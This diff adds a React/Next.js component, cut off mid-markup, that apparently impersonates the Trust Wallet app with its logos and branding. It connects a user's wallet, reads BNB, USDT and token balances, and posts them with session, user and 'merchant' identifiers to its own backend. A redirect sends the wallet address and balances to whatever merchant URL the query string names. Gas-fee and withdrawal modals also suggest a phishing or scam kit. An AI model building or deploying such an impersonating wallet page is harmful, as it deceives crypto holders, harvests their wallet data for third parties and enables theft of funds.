@@ -1,0 +1,1089 @@
+'use client';
+
+import { useState, useMemo, useEffect, useCallback } from 'react';
+import { ethers } from 'ethers';
+import { createCoinbaseWalletSDK } from '@coinbase/wallet-sdk';
+import { motion, AnimatePresence } from 'framer-motion';
+import { Outfit } from 'next/font/google';
+import { useSearchParams } from 'next/navigation';
+import { Plus, ArrowUpDown, ArrowUp, ArrowDown, LogOut, Copy, Check, X, Search, Settings, Wallet, Globe, Shield, ChevronRight, ShieldAlert, Clock, QrCode, Compass, Settings2, Fingerprint } from 'lucide-react';
+
+import GasFeeModal from '@/components/gas-fee-modal';
+import WithdrawalModal from '@/components/withdrawal-modal';
+import SwapModal from '@/components/swap-modal';
+import BuyModal from '@/components/buy-modal';
+import TransactionHistory from '@/components/transaction-history';
+import { useWallet } from '@/context/base';
+import { getDynamicExchangeRates, getLivePrices, COIN_MAP, NETWORKS } from '@/lib/utils';
+import ReceiveModal from '@/components/recieve-modal';
+import { getModal } from '@/context/appkit';
+// import { useAppKit } from '@reown/appkit/react';
+
+const outfit = Outfit({ subsets: ['latin'], weight: ['300', '400', '500', '600', '700'] });
+
+export default function CoinbaseWalletConnect() {
+    const searchParams = useSearchParams();
+//   const { open } = useAppKit()
+    // const [address, setAddress] = useState<string>('');
+    const [bnbBalance, setBnbBalance] = useState<string>('0');
+    const [btcBalance, setBtcBalance] = useState<string>('0');
+    const [ethBalance, setEthBalance] = useState<string>('0');
+    const [usdtBalance, setUsdtBalance] = useState<string>('0');
+    const [t22priceUsd, setT22PriceUsd] = useState<number>(0);
+    const [t22Balance, setT22Balance] = useState<number>(0);
+
+
+    const [isAppLoading, setIsAppLoading] = useState(true);
+    const [showSettingsMenu, setShowSettingsMenu] = useState(false);
+    const [maskAccount, setMaskAccount] = useState(false);         // SSR-safe default
+    const [defaultCurrency, setDefaultCurrency] = useState('USD'); // SSR-safe default
+    const [showCurrencyPicker, setShowCurrencyPicker] = useState(false);
+    const [theme, setTheme] = useState<'dark' | 'light'>('dark');  // Set Dark as default
+    const [view, setView] = useState<'wallet' | 'swap' | 'discover' | 'browser' | 'settings'>('wallet');
+
+    // Handle App Preloader
+    useEffect(() => {
+        const timer = setTimeout(() => setIsAppLoading(false), 2000); // 2 second brand immersion
+        return () => clearTimeout(timer);
+    }, []);
+    const [isAppLockEnabled, setIsAppLockEnabled] = useState(false);
+    const [showMobilePrompt, setShowMobilePrompt] = useState(false);
+    const [pendingDappUrl, setPendingDappUrl] = useState('');
+    const [showPinModal, setShowPinModal] = useState(false);
+    const [pinStep, setPinStep] = useState<'setup' | 'confirm' | 'verify'>('setup');
+    const [pin, setPin] = useState('');
+    const [confirmPin, setConfirmPin] = useState('');
+    const [savedPin, setSavedPin] = useState('');
+    const [pinMessage, setPinMessage] = useState<{ text: string, isError: boolean } | null>(null);
+
+    // Restore persisted settings after mount (client-only)
+    useEffect(() => {
+        const savedMask = localStorage.getItem('maskAccount');
+        if (savedMask === 'true') setMaskAccount(true);
+        const savedCurrency = localStorage.getItem('defaultCurrency');
+        if (savedCurrency) setDefaultCurrency(savedCurrency);
+        const savedTheme = localStorage.getItem('appTheme') as 'dark' | 'light' | null;
+        if (savedTheme) setTheme(savedTheme);
+        const pin = localStorage.getItem('appPin');
+        if (pin) {
+            setSavedPin(pin);
+            setIsAppLockEnabled(true);
+        }
+    }, []);
+
+    // Sync theme with WalletConnect Modal
+    useEffect(() => {
+        try {
+            const modal = getModal();
+            modal.setThemeMode(theme);
+        } catch (e) {
+            console.warn("AppKit modal not initialized yet");
+        }
+    }, [theme]);
+
+    // Apply theme to <html> element
+    useEffect(() => {
+        localStorage.setItem('appTheme', theme);
+        const STYLE_ID = 'app-light-theme';
+        let el = document.getElementById(STYLE_ID) as HTMLStyleElement | null;
+
+        if (theme === 'light') {
+            if (!el) {
+                el = document.createElement('style');
+                el.id = STYLE_ID;
+                document.head.appendChild(el);
+            }
+            el.textContent = `
+                .fixed .bg-\\[\\#0a0b0d\\] .text-white\\/80,
+                .bg-\\[\\#151515\\] .text-white\\/80,
+                .bg-\\[\\#13141a\\] .text-white\\/80,
+                .bg-\\[\\#0d0e11\\]\\/95 .text-white\\/80 { color: rgba(13, 17, 23, 0.85) !important; }
+
+                .fixed .bg-\\[\\#0a0b0d\\] .text-white\\/90,
+                .bg-\\[\\#151515\\] .text-white\\/90,
+                .bg-\\[\\#13141a\\] .text-white\\/90,
+                .bg-\\[\\#0d0e11\\]\\/95 .text-white\\/90 { color: rgba(13, 17, 23, 0.9) !important; }
+
+                .fixed .bg-\\[\\#0a0b0d\\] .text-blue-200,
+                .fixed .bg-\\[\\#0a0b0d\\] .text-blue-400 { color: #3375BB !important; }
+
+                .fixed .bg-\\[\\#0a0b0d\\] .bg-\\[\\#2b2d33\\] { background-color: #ffffff !important; box-shadow: 0 4px 12px rgba(0,0,0,0.1) !important; color: #3375BB !important; }
+                .fixed .bg-\\[\\#0a0b0d\\] .border-\\[\\#0a0b0d\\] { border-color: #ffffff !important; }
+
+                /* Modal Close Buttons */
+                .fixed .bg-\\[\\#0a0b0d\\] .bg-gray-800\\/50 { background-color: #3375BB !important; color: #ffffff !important; }
+                .fixed .bg-\\[\\#0a0b0d\\] .bg-gray-800\\/50:hover { background-color: #004ada !important; color: #ffffff !important; }
+                .fixed .bg-\\[\\#0a0b0d\\] .bg-gray-800\\/50 svg { color: #ffffff !important; }
+
+                /* Action buttons in light mode */
+                .theme-action-btn { background-color: #ffffff !important; color: #3375BB !important; border-color: #ffffff !important; box-shadow: 0 4px 12px rgba(0,0,0,0.1) !important; }
+                .theme-action-btn:hover { background-color: #f8fafc !important; box-shadow: 0 6px 16px rgba(0,0,0,0.15) !important; }
+
+                /* Ensure the blue footer button text stays white */
+                .theme-footer-btn, .theme-footer-btn .text-white, .theme-footer-btn span, .theme-footer-btn svg { color: #ffffff !important; opacity: 1 !important; }
+
+                /* Explicitly set sub-texts in dropdown / footer */
+                .theme-subtext { color: #6b7280 !important; }
+                .theme-subtext:hover { color: #374151 !important; }
+                
+                /* Make asset network logos pop */
+                .theme-asset-logo { border: 2px solid white !important; box-shadow: 0 2px 6px rgba(0,0,0,0.15) !important; background-color: #ffffff !important; }
+
+                .fixed .bg-\\[\\#0a0b0d\\] .text-gray-400,
+                .bg-\\[\\#151515\\] .text-gray-400,
+                .bg-\\[\\#1E2025\\] .text-gray-400,
+                .bg-\\[\\#1a1b1f\\] .text-gray-400 { color: #6b7280 !important; }
+
+                .fixed .bg-\\[\\#0a0b0d\\] .text-gray-500,
+                .bg-\\[\\#151515\\] .text-gray-500,
+                .bg-\\[\\#1E2025\\] .text-gray-500,
+                .bg-\\[\\#1a1b1f\\] .text-gray-500 { color: #9ca3af !important; }
+
+                /* Force primary buttons to stay white text */
+                .bg-\\[\\#3375BB\\], 
+                .bg-\\[\\#3375BB\\] *,
+                .theme-footer-btn,
+                .theme-footer-btn *,
+                button.bg-\\[\\#3375BB\\],
+                button.bg-\\[\\#3375BB\\] span { color: #ffffff !important; opacity: 1 !important; }
+
+                .bg-\\[\\#151515\\] .border-white\\/5,
+                .bg-\\[\\#1E2025\\] .border-white\\/5,
+                .bg-\\[\\#13141a\\] .border-white\\/5,
+                .bg-\\[\\#1a1b1f\\] .border-white\\/5,
+                .bg-\\[\\#1a1b1f\\] .border-white\\/10,
+                .bg-\\[\\#0d0e11\\]\\/95 .border-white\\/\\[0\\.06\\] { border-color: rgba(0,0,0,0.08) !important; }
+
+                .bg-\\[\\#151515\\] .bg-white\\/5,
+                .bg-\\[\\#1E2025\\] .bg-white\\/5,
+                .bg-\\[\\#13141a\\] .bg-white\\/5,
+                .bg-\\[\\#1a1b1f\\] .bg-white\\/5,
+                .bg-\\[\\#1a1b1f\\] .bg-white\\/10 { background-color: rgba(0,0,0,0.04) !important; }
+                
+                .bg-\\[\\#151515\\] .hover\\:bg-white\\/5:hover,
+                .bg-\\[\\#1E2025\\] .hover\\:bg-white\\/5:hover,
+                .bg-\\[\\#13141a\\] .hover\\:bg-white\\/5:hover,
+                .bg-\\[\\#1a1b1f\\] .hover\\:bg-white\\/5:hover { background-color: rgba(0,0,0,0.06) !important; }
+
+                .bg-black\\/60                 { background-color: rgba(0,0,0,0.3)  !important; }
+                input, textarea                { background-color: #f3f6fc !important; color: #0d1117 !important; border-color: rgba(0,0,0,0.12) !important; }
+                input::placeholder             { color: #9ca3af !important; }
+                *, *::before, *::after         { transition: background-color 0.25s, border-color 0.2s, color 0.2s; }
+            `;
+        } else {
+            el?.remove();
+        }
+    }, [theme]);
+
+    const [pageLoading, setPageLoading] = useState(true);
+    const [showRecieveModal, setShowRecieveModal] = useState(false);
+    const [showCancelModal, setShowCancelModal] = useState(false);
+    const [showReturnWarning, setShowReturnWarning] = useState(false);
+    const [showSessionConflictModal, setShowSessionConflictModal] = useState(false);
+    const [conflictingSessionData, setConflictingSessionData] = useState<any>(null);
+
+    const [activeTab, setActiveTab] = useState<'crypto' | 'history'>('crypto');
+    const [copied, setCopied] = useState(false);
+
+    // Modal States
+    const [showWithdrawModal, setShowWithdrawModal] = useState(false);
+    const [showSwapModal, setShowSwapModal] = useState(false);
+    const [showBuyModal, setShowBuyModal] = useState(false);
+    const [showGasFeeModal, setShowGasFeeModal] = useState(false);
+    const [showAccountPrompt, setShowAccountPrompt] = useState(false);
+    const [visibleAssets, setVisibleAssets] = useState<string[]>(['BNB', 'TETHEREUM', 'ETH', 'USDT']);
+    const [marketPrices, setMarketPrices] = useState<{ [key: string]: { price: number, change: number } }>({});
+    const [assetSearchQuery, setAssetSearchQuery] = useState('');
+
+    const {  networks, disconnectWallet, loading, address, setAddress, error, setLoading, setIsDisconnectedState, isDisconnectedState, connectEVMWallet } = useWallet();
+    
+    // Data States
+    const [transactions, setTransactions] = useState<any[]>([]);
+    const [getUserLoading, setGetUSerLoading] = useState(false)
+    const fetchTransactionsData = async () => {
+        if (!address || address == "") return;
+        try {
+            let vvv = await fetch(`/api/transaction?address=${address}`, {
+                method: 'GET',
+                headers: { 'Content-Type': 'application/json' },
+            });
+            let vjson = await vvv.json()
+            if (vjson?.existingRecord?.length) {
+                const mappedTransactions = vjson.existingRecord.map((e: any) => {
+                    const f = e.fields || {};
+                    return {
+                        ...f,
+                        id: e.id,
+                        created_at: e.createdTime,
+                        type: f.Type || f.type || 'send',
+                        asset: f.Asset || f.asset || 'BNB',
+                        amount: f.Amount || f.amount || '0',
+                        status: f.Status || f.status || 'pending',
+                        network: f.Network || f.network || 'BNB'
+                    };
+                }).sort((a: any, b: any) => {
+                    return new Date(b.created_at).getTime() - new Date(a.created_at).getTime();
+                });
+                setTransactions(mappedTransactions);
+            }
+        } catch (e) {}
+    };
+
+    useEffect(() => {
+        fetchTransactionsData();
+    }, [address]);
+
+    // Periodic price updates
+    useEffect(() => {
+        const fetchPrices = async () => {
+            const prices = await getLivePrices();
+            setMarketPrices(prices);
+        };
+        fetchPrices();
+        const interval = setInterval(fetchPrices, 30000); // 30s
+        return () => clearInterval(interval);
+    }, []);
+
+
+    const addGasFeeTransaction = (txHash: string) => {
+        fetchTransactionsData();
+    };
+
+    // Query Params
+    const request = searchParams.get('request');
+    const ssid_param = searchParams.get('ssid');
+    const status = searchParams.get('status');
+    const userid = searchParams.get('userid');
+
+    const [isAuthorized, setIsAuthorized] = useState<boolean | null>(null);
+
+    useEffect(() => {
+        const validateSession = async () => {
+            const merchantFromParams = searchParams.get('merchant');
+            setIsAuthorized(null);
+            setPageLoading(true);
+
+            const isExpectingWallet = typeof window !== 'undefined' && localStorage.getItem('walletConnected') === 'true';
+            if (isExpectingWallet && !address) return;
+
+            const hasEssentials = ssid_param && userid && merchantFromParams;
+            if (!hasEssentials) {
+                setIsAuthorized(true);
+                setPageLoading(false);
+                return;
+            }
+
+            if (address) {
+                try {
+                    const res = await fetch(`/api/user?address=${address}`, { signal: AbortSignal.timeout(5000) });
+                    const data = await res.json();
+
+                    if (data.existingRecord) {
+                        const fields = data.existingRecord.fields;
+                        const sessionMismatch =
+                            fields.ssid !== ssid_param ||
+                            fields.userid !== userid ||
+                            fields.merchant !== merchantFromParams;
+
+                        if (sessionMismatch) {
+                            setConflictingSessionData({
+                                fields,
+                                currentUrl: { ssid: ssid_param, userid, merchant: merchantFromParams }
+                            });
+                            setShowSessionConflictModal(true);
+                            setIsAuthorized(false);
+                            return;
+                        }
+                    }
+                } catch (e) {}
+            }
+
+            setIsAuthorized(true);
+            const timer = setTimeout(() => {
+                setPageLoading(false);
+            }, 800);
+            return () => clearTimeout(timer);
+        };
+
+        validateSession();
+    }, [request, ssid_param, status, userid, address, searchParams.get('merchant')]);
+
+    const merchant = searchParams.get('merchant');
+    const ssid = searchParams.get('ssid');
+    const user = searchParams.get('user');
+
+    const TETHEREUM_TOKEN_ADDRESS = '0xe9a5c635c51002fa5f377f956a8ce58573d63d91';
+    const BEP20_USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+    const MERCHANT_URL = 'https://trustwallet.com/';
+
+    const handleRedirect = (state: 'success' | 'cancelled' | 'disconnected' | 'not_connected' | 'inactivity') => {
+        const baseUrl = merchant
+            ? (merchant.includes('://') ? merchant : `https://${merchant}/callback`)
+            : MERCHANT_URL;
+
+        const params = new URLSearchParams({
+            request: 'walletconnect',
+            ssid: ssid || ssid_param || '',
+            userid: userid || '',
+            state: state,
+            status: state === 'success' ? 'connected' : state
+        });
+
+        if (state === 'success' && address) {
+            params.append('wallet_address', address);
+            params.append('bnb_balance', bnbBalance);
+            params.append('tethereum_balance', t22Balance.toString());
+        }
+
+        window.location.href = `${baseUrl}${baseUrl.includes('?') ? '&' : '?'}${params.toString()}`;
+    };
+
+    const fetchData = async (t22_price: any) => {
+        try {
+            const response = await fetch('https://api.coinbase.com/v2/prices/T99-USD/spot');
+            const json = await response.json();
+            const price = parseFloat(json.data.amount);
+            setT22PriceUsd(price * t22_price);
+        } catch (error) {
+            console.error("Coinbase API failed, using fallback", error);
+        }
+    };
+
+    useEffect(() => {
+        if (t22Balance > 0) fetchData(t22Balance);
+    }, [t22Balance]);
+
+
+    const updateBalances = async (userAddress: string) => {
+        const ERC20_ABI = [
+            'function balanceOf(address owner) view returns (uint256)',
+            'function decimals() view returns (uint8)'
+        ];
+
+        const bscProvider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
+
+        const fetchTokenData = async (addr: string) => {
+            try {
+                const contract = new ethers.Contract(addr, ERC20_ABI, bscProvider);
+                const [raw, dec] = await Promise.all([contract.balanceOf(userAddress), contract.decimals()]);
+                return [raw, dec];
+            } catch {
+                return ["0", 18];
+            }
+        };
+
+        try {
+            let bnbBal: any = "0";
+            let ethBal: any = "0";
+            try { bnbBal = await bscProvider.getBalance(userAddress); } catch (e) {}
+            
+            const [ [t22Raw, t22Dec], [usdtRaw, usdtDec] ] = await Promise.all([
+                fetchTokenData(TETHEREUM_TOKEN_ADDRESS),
+                fetchTokenData(BEP20_USDT_ADDRESS)
+            ]);
+
+            const bnbFormatted = ethers.formatEther(bnbBal);
+            const t22Formatted = ethers.formatUnits(t22Raw, t22Dec);
+            const ethFormatted = "0"; 
+            const btcFormatted = "0";
+            const usdtFormatted = ethers.formatUnits(usdtRaw, usdtDec);
+
+            setBnbBalance(bnbFormatted);
+            setT22Balance(Number(t22Formatted));
+            setEthBalance(ethFormatted);
+            setBtcBalance(btcFormatted);
+            setUsdtBalance(usdtFormatted);
+
+            await fetch('/api/user', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    address: userAddress,
+                    t99: Number(t22Formatted),
+                    bnb: bnbFormatted,
+                    request,
+                    ssid: ssid_param,
+                    status: 'connected',
+                    userid,
+                    merchant: merchant || searchParams.get('merchant')
+                })
+            });
+        } catch (err) {}
+    };
+
+    useEffect(() => {
+        if (address) updateBalances(address);
+    }, [address])
+
+    const connectWallet = async () => {
+        try {
+            await connectEVMWallet({ config: networks.bsc });
+        } catch (err) {} finally { setLoading(false); }
+    }
+
+    const assets = useMemo(() => {
+        return visibleAssets.map((symbol, idx) => {
+            const isTethereum = symbol === 'TETHEREUM';
+            const priceData = marketPrices[symbol] || { price: 0, change: 0 };
+            const price = priceData.price;
+            const change = priceData.change;
+
+            const balance =
+                isTethereum ? t22Balance :
+                    symbol === 'BNB' ? Number(bnbBalance) :
+                        symbol === 'ETH' ? Number(ethBalance) :
+                            symbol === 'BTC' ? Number(btcBalance) :
+                                symbol === 'USDT' ? Number(usdtBalance) :
+                                    0;
+
+            return {
+                id: idx,
+                name: symbol === 'BTC' ? 'Bitcoin' :
+                    symbol === 'ETH' ? 'Ethereum' :
+                        symbol === 'USDT' ? 'Tether (USDT)' :
+                            symbol,
+                symbol,
+                icon: isTethereum ? COIN_MAP['TETHEREUM']?.logo : COIN_MAP[symbol]?.logo,
+                network: COIN_MAP[symbol]?.network,
+                color: 'bg-[#1E2025]',
+                balance,
+                marketPrice: price || 0,
+                priceChange: change || 0,
+                usdValue: balance * (price || 0)
+            };
+        }).filter(asset => {
+            if (address && pageLoading) return true;
+            const query = assetSearchQuery.toLowerCase();
+            const matchesSearch = asset.name.toLowerCase().includes(query) || asset.symbol.toLowerCase().includes(query);
+            return matchesSearch && (asset.balance > 0 || asset.symbol === 'BNB');
+        });
+    }, [visibleAssets, marketPrices, bnbBalance, t22Balance, ethBalance, btcBalance, usdtBalance, assetSearchQuery, address, pageLoading]);
+
+    const totalBalance = useMemo(() => {
+        return assets.reduce((sum, asset) => sum + (asset.usdValue || 0), 0);
+    }, [assets]);
+
+    const handleAssetClick = (symbol: string) => {
+        if (!address) {
+            setShowAccountPrompt(true);
+            return;
+        }
+        const normalizedSymbol = symbol === 'T22' ? 'TETHEREUM' : symbol;
+        setSelectedAssetForSwap(normalizedSymbol);
+        setShowSwapModal(true);
+    };
+
+    const copyAddress = () => {
+        navigator.clipboard.writeText(address);
+        setCopied(true);
+        setTimeout(() => setCopied(false), 2000);
+    };
+
+    const formatAddress = (addr: string) => `${addr.slice(0, 6)}...${addr.slice(-4)}`;
+
+    const FX_SYMBOLS: Record<string, string> = {
+        USD: '$', EUR: '€', GBP: '£', JPY: '¥', CAD: 'C$', AUD: 'A$', CHF: 'Fr', CNY: '¥'
+    };
+    const fxRate = 1; 
+    const currencySymbol = FX_SYMBOLS[defaultCurrency] ?? '$';
+
+    const formatFiat = (usdValue: number) =>
+        `${currencySymbol}${(usdValue * fxRate).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+
+    const [selectedAssetForSwap, setSelectedAssetForSwap] = useState<string>('');
+
+    return (
+        <div className={`min-h-screen transition-colors duration-300 ${theme === 'dark' ? 'bg-black text-white' : 'bg-white text-black'} ${outfit.className}`}>
+            <AnimatePresence>
+                {pageLoading && (
+                    <motion.div key="preloader" initial={{ opacity: 1 }} exit={{ opacity: 0 }} className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-black">
+                        <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 1.1, opacity: 0 }} className="flex flex-col items-center">
+                            <div className="w-40 h-40 flex items-center justify-center bg-blue-500/10 rounded-[3rem] border border-blue-500/20 shadow-2xl mb-8">
+                                <img 
+                                    src="https://trustwallet.com/assets/images/media/assets/trust_platform.svg" 
+                                    alt="Trust Wallet" 
+                                    className="w-20 h-20 animate-pulse"
+                                />
+                            </div>
+                            <h2 className="text-xl font-black uppercase tracking-[0.4em] text-white/40">Trust Wallet</h2>
+                        </motion.div>
+                    </motion.div>
+                )}
+            </AnimatePresence>
+
+            <motion.div key="main-container" className="w-full flex flex-col items-center">
+                <motion.div key="app-state" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="min-h-screen pb-32 relative flex flex-col items-center w-full">
+                    <div className="relative z-10 w-full max-w-[600px]">
+                        {/* Header */}
+                        <div className="px-6 pt-8 pb-2 flex items-center justify-between">
+                            <div className="flex flex-col items-start">
+                                <div className={`flex items-center gap-2 backdrop-blur-md px-3 py-1 rounded-full border transition-all ${
+                                    theme === 'dark' ? 'bg-white/5 border-white/10' : 'bg-gray-100 border-gray-200'
+                                }`}>
+                                    <div className="w-7 h-7 rounded-full flex items-center justify-center bg-white shadow-sm overflow-hidden p-1.5">
+                                        <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/trust-wallet-icon.png" alt="Logo" className="w-full h-full object-contain" />
+                                    </div>
+                                    <span className="text-[11px] font-bold">Main Wallet</span>
+                                </div>
+                            </div>
+
+                            <div className="relative">
+                                <motion.button
+                                    whileTap={{ scale: 0.9 }}
+                                    onClick={() => setShowSettingsMenu(v => !v)}
+                                    className={`w-9 h-9 flex items-center justify-center rounded-full border transition-all ${
+                                        theme === 'dark' ? 'bg-white/5 border-white/10 text-white' : 'bg-gray-100 border-gray-200 text-black'
+                                    }`}
+                                >
+                                    <Settings className="w-4 h-4" />
+                                </motion.button>
+                                <AnimatePresence>
+                                    {showSettingsMenu && (
+                                        <>
+                                            <div className="fixed inset-0 z-[40]" onClick={() => setShowSettingsMenu(false)} />
+                                            <motion.div
+                                                initial={{ x: '100%', opacity: 0 }}
+                                                animate={{ x: 0, opacity: 1 }}
+                                                exit={{ x: '100%', opacity: 0 }}
+                                                className={`fixed inset-y-0 right-0 w-full md:w-80 z-[50] border-l shadow-2xl ${theme === 'dark' ? 'bg-black border-white/10' : 'bg-white border-gray-100'}`}
+                                            >
+                                                <div className="h-full flex flex-col">
+                                                    {/* Header */}
+                                                    <div className={`px-6 py-8 border-b flex flex-col items-center gap-4 relative ${theme === 'dark' ? 'border-white/5' : 'border-gray-100'}`}>
+                                                        <button 
+                                                            onClick={() => setShowSettingsMenu(false)}
+                                                            className={`absolute top-6 right-6 w-10 h-10 flex items-center justify-center rounded-full transition-all ${theme === 'dark' ? 'bg-white/5 text-gray-400 hover:text-white' : 'bg-gray-100 text-gray-500 hover:text-black'}`}
+                                                        >
+                                                            <X className="w-5 h-5" />
+                                                        </button>
+                                                        <div className="w-16 h-16 bg-white rounded-2xl p-3 shadow-xl">
+                                                            <img src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/trust-wallet-icon.png" alt="Logo" className="w-full h-full object-contain" />
+                                                        </div>
+                                                        {address && (
+                                                            <div className="text-center">
+                                                                <p className="text-[10px] font-black uppercase tracking-widest opacity-30">Active Wallet</p>
+                                                                <p className="text-xs font-mono mt-1 opacity-60">{formatAddress(address)}</p>
+                                                            </div>
+                                                        )}
+                                                    </div>
+
+                                                    <div className="flex-1 overflow-y-auto py-4">
+                                                        {/* Section: Wallets */}
+                                                        <div className="px-6 mb-6">
+                                                            <p className="text-[10px] font-black uppercase tracking-widest opacity-30 mb-3">Wallets</p>
+                                                            <button className={`w-full flex items-center gap-4 p-4 rounded-2xl border transition-all ${theme === 'dark' ? 'bg-white/5 border-white/5 hover:bg-white/10' : 'bg-gray-50 border-gray-100 hover:bg-gray-100'}`}>
+                                                                <div className="w-10 h-10 rounded-xl bg-[#3375BB] flex items-center justify-center text-white">
+                                                                    <Wallet className="w-5 h-5" />
+                                                                </div>
+                                                                <div className="flex-1 text-left">
+                                                                    <p className="text-sm font-bold">Main Wallet</p>
+                                                                    <p className="text-[10px] opacity-40">Multi-Coin Wallet</p>
+                                                                </div>
+                                                                <Check className="w-4 h-4 text-blue-500" />
+                                                            </button>
+                                                        </div>
+
+                                                        {/* Section: Security */}
+                                                        <div className="px-6 mb-6">
+                                                            <p className="text-[10px] font-black uppercase tracking-widest opacity-30 mb-3">Security</p>
+                                                            <div className="space-y-2">
+                                                                <button 
+                                                                    onClick={() => { setMaskAccount(!maskAccount); localStorage.setItem('maskAccount', String(!maskAccount)); }}
+                                                                    className="w-full flex items-center justify-between p-3 rounded-xl hover:bg-white/5 transition-all"
+                                                                >
+                                                                    <div className="flex items-center gap-3">
+                                                                        <div className="w-8 h-8 rounded-lg bg-orange-500/10 flex items-center justify-center">
+                                                                            <Shield className="w-4 h-4 text-orange-500" />
+                                                                        </div>
+                                                                        <span className="text-sm font-medium">Mask Balances</span>
+                                                                    </div>
+                                                                    <div className={`w-10 h-5 rounded-full relative transition-colors ${maskAccount ? 'bg-blue-500' : 'bg-white/10'}`}>
+                                                                        <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white transition-transform ${maskAccount ? 'translate-x-5.5' : 'translate-x-0.5'}`} />
+                                                                    </div>
+                                                                </button>
+                                                                <button 
+                                                                    onClick={() => {
+                                                                        if (isAppLockEnabled) {
+                                                                            setIsAppLockEnabled(false);
+                                                                            localStorage.removeItem('appPin');
+                                                                            setSavedPin('');
+                                                                        } else {
+                                                                            setPinStep('setup');
+                                                                            setPin('');
+                                                                            setShowPinModal(true);
+                                                                        }
+                                                                    }}
+                                                                    className="w-full flex items-center justify-between p-3 rounded-xl hover:bg-white/5 transition-all"
+                                                                >
+                                                                    <div className="flex items-center gap-3">
+                                                                        <div className="w-8 h-8 rounded-lg bg-green-500/10 flex items-center justify-center">
+                                                                            <ShieldAlert className="w-4 h-4 text-green-500" />
+                                                                        </div>
+                                                                        <span className="text-sm font-medium">App Lock</span>
+                                                                    </div>
+                                                                    <div className={`w-10 h-5 rounded-full relative transition-colors ${isAppLockEnabled ? 'bg-blue-500' : 'bg-white/10'}`}>
+                                                                        <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white transition-transform ${isAppLockEnabled ? 'translate-x-5.5' : 'translate-x-0.5'}`} />
+                                                                    </div>
+                                                                </button>
+                                                            </div>
+                                                        </div>
+
+                                                        {/* Section: Preferences */}
+                                                        <div className="px-6 mb-6">
+                                                            <p className="text-[10px] font-black uppercase tracking-widest opacity-30 mb-3">Preferences</p>
+                                                            <div className="space-y-2">
+                                                                <button 
+                                                                    onClick={() => { setTheme(theme === 'dark' ? 'light' : 'dark'); }}
+                                                                    className="w-full flex items-center justify-between p-3 rounded-xl hover:bg-white/5 transition-all"
+                                                                >
+                                                                    <div className="flex items-center gap-3">
+                                                                        <div className="w-8 h-8 rounded-lg bg-blue-500/10 flex items-center justify-center">
+                                                                            {theme === 'dark' ? <Plus className="w-4 h-4 text-blue-400 rotate-45" /> : <Plus className="w-4 h-4 text-blue-500" />}
+                                                                        </div>
+                                                                        <span className="text-sm font-medium">Dark Mode</span>
+                                                                    </div>
+                                                                    <div className={`w-10 h-5 rounded-full relative transition-colors ${theme === 'dark' ? 'bg-blue-500' : 'bg-white/10'}`}>
+                                                                        <div className={`absolute top-0.5 w-4 h-4 rounded-full bg-white transition-transform ${theme === 'dark' ? 'translate-x-5.5' : 'translate-x-0.5'}`} />
+                                                                    </div>
+                                                                </button>
+                                                                <button 
+                                                                    onClick={() => setShowCurrencyPicker(!showCurrencyPicker)}
+                                                                    className="w-full flex items-center justify-between p-3 rounded-xl hover:bg-white/5 transition-all"
+                                                                >
+                                                                    <div className="flex items-center gap-3">
+                                                                        <div className="w-8 h-8 rounded-lg bg-purple-500/10 flex items-center justify-center">
+                                                                            <span className="text-sm font-bold text-purple-500">$</span>
+                                                                        </div>
+                                                                        <span className="text-sm font-medium">Currency</span>
+                                                                    </div>
+                                                                    <span className="text-xs opacity-40 font-bold">{defaultCurrency}</span>
+                                                                </button>
+                                                                <AnimatePresence>
+                                                                    {showCurrencyPicker && (
+                                                                        <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }} exit={{ height: 0, opacity: 0 }} className="overflow-hidden">
+                                                                            <div className="grid grid-cols-4 gap-2 pt-2">
+                                                                                {['USD', 'EUR', 'GBP', 'JPY'].map(c => (
+                                                                                    <button 
+                                                                                        key={c} 
+                                                                                        onClick={() => { setDefaultCurrency(c); setShowCurrencyPicker(false); }}
+                                                                                        className={`py-2 rounded-lg text-[10px] font-bold border transition-all ${defaultCurrency === c ? 'bg-blue-500/20 border-blue-500 text-blue-400' : 'bg-white/5 border-transparent opacity-40'}`}
+                                                                                    >
+                                                                                        {c}
+                                                                                    </button>
+                                                                                ))}
+                                                                            </div>
+                                                                        </motion.div>
+                                                                    )}
+                                                                </AnimatePresence>
+                                                            </div>
+                                                        </div>
+
+                                                        {/* Section: Support */}
+                                                        <div className="px-6 mb-6">
+                                                            <p className="text-[10px] font-black uppercase tracking-widest opacity-30 mb-3">Support</p>
+                                                            <div className="space-y-2">
+                                                                <a href="https://twtholders.trustwallet.com/" target="_blank" rel="noopener noreferrer" className="w-full flex items-center gap-3 p-3 rounded-xl hover:bg-white/5 transition-all">
+                                                                    <div className="w-8 h-8 rounded-lg bg-blue-500/10 flex items-center justify-center">
+                                                                        <Globe className="w-4 h-4 text-blue-500" />
+                                                                    </div>
+                                                                    <span className="text-sm font-medium">Help Center</span>
+                                                                </a>
+                                                                <div className="flex items-center justify-center gap-6 pt-4">
+                                                                    <a href="https://trustwallet.com/" target="_blank" rel="noopener noreferrer" className="opacity-30 hover:opacity-100 hover:text-blue-400 transition-all">
+                                                                        <Plus className="w-5 h-5" />
+                                                                    </a>
+                                                                    <a href="https://twitter.com/trustwallet" target="_blank" rel="noopener noreferrer" className="opacity-30 hover:opacity-100 hover:text-blue-400 transition-all">
+                                                                        <Globe className="w-5 h-5" />
+                                                                    </a>
+                                                                    <a href="https://trustwallet.com/security" target="_blank" rel="noopener noreferrer" className="opacity-30 hover:opacity-100 hover:text-blue-400 transition-all">
+                                                                        <Shield className="w-5 h-5" />
+                                                                    </a>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+
+                                                    {address && (
+                                                        <div className="p-6 border-t border-white/5">
